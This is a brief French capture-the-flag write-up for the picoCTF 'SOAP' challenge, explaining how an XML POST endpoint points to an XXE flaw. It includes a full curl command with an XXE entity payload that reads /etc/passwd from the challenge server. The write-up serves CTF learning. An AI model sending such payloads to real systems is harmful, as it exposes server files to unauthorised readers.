# SOAP

Le challenge nous présente un site présentant 3 liens `details` et on doit essayer de lire le fichier `/etc/password`

Un clic sur le lien correspond à une requête POST dont le `Content-Type` est `application/xm` => cela doit nous faire penser à la vulnerabilité [**xxe**](https://www.vaadata.com/blog/fr/comprendre-les-vulnerabilites-web-en-5-min-episode-11-xxe/)

Il faut dont injecter un code xml utilisant *entity* : 

```
curl -v http://saturn.picoctf.net:58868/data \
     -H "Content-Type: application/xml" \
     -H "Accept: application/xml" \
     -d '
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
          <data>
            <ID>&xxe;</ID>
          </data>
        '
```

Pour l'utilisation avec BURP Suite : https://medium.com/@World-Breaker/picoctf-soap-9807894fced4 
